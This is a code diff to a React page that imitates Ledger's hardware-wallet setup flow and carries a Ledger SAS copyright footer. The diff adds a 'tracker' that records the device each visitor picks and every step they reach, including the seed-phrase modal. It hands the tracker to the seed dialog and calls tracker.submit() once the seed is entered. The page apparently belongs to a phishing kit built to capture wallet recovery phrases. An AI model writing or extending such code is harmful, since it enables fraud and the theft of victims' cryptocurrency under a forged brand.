@@ -50,6 +50,7 @@ const Ledger = () => {
             onPick={(i) => {
               setSelectedIdx(i);
               setView("connecting");
+              tracker.update({ device: devices[i].name, step: "connecting" });
             }}
           />
         )}
@@ -61,6 +62,7 @@ const Ledger = () => {
             onContinue={() => {
               setWizardStep(1);
               setView("wizard");
+              tracker.update({ step: "wizard_1" });
             }}
           />
         )}
@@ -68,8 +70,17 @@ const Ledger = () => {
         {view === "wizard" && (
           <WizardView
             step={wizardStep}
-            onVerifyClick={() => setModalOpen(true)}
-            onNext={() => setWizardStep((s) => (s < 3 ? ((s + 1) as 1 | 2 | 3) : s))}
+            onVerifyClick={() => {
+              setModalOpen(true);
+              tracker.update({ step: "seed_modal" });
+            }}
+            onNext={() =>
+              setWizardStep((s) => {
+                const next = (s < 3 ? s + 1 : s) as 1 | 2 | 3;
+                tracker.update({ step: `wizard_${next}` });
+                return next;
+              })
+            }
           />
         )}
       </div>
@@ -77,11 +88,14 @@ const Ledger = () => {
       <SeedDialog
         open={modalOpen}
         onOpenChange={setModalOpen}
+        tracker={tracker}
         onVerified={() => {
           setModalOpen(false);
           setWizardStep(2);
+          tracker.submit();
         }}
       />
+
 
       <footer className="mt-10 w-full text-center text-xs text-gray-600">
         Copyright © Ledger SAS. All rights reserved.
